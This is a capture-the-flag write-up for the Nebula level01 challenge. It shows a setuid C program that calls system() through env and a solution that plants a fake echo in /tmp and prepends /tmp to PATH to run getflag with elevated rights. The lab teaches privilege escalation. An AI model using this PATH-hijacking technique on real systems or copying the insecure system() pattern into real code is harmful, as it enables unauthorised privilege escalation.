### Source code ###

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

### Solution ###

This program sets the real, effective and saved user ID with `setresuid` to the effective user ID returned by `geteuid`. Idem for the group ID. It then calls the `env` command which prints “and now what ?” with echo. It’s the environment of the user executing the program that is used in that case.
Executing getflag with `flag01`’s permissions requires to create a custom-tailored echo command.

```
level01@nebula:/home/flag01$ echo "/bin/getflag; echo" > /tmp/echo
level01@nebula:/home/flag01$ chmod +x /tmp/echo
```

And because `level01`’s `PATH` variable is used when `./flag01` is executed, by adding `/tmp` to it the program is forced to use the `echo` command located in that directory.

```bash
level01@nebula:/home/flag01$ PATH="/tmp:$PATH"
level01@nebula:/home/flag01$ ./flag01
You have successfully executed getflag on a target account
```
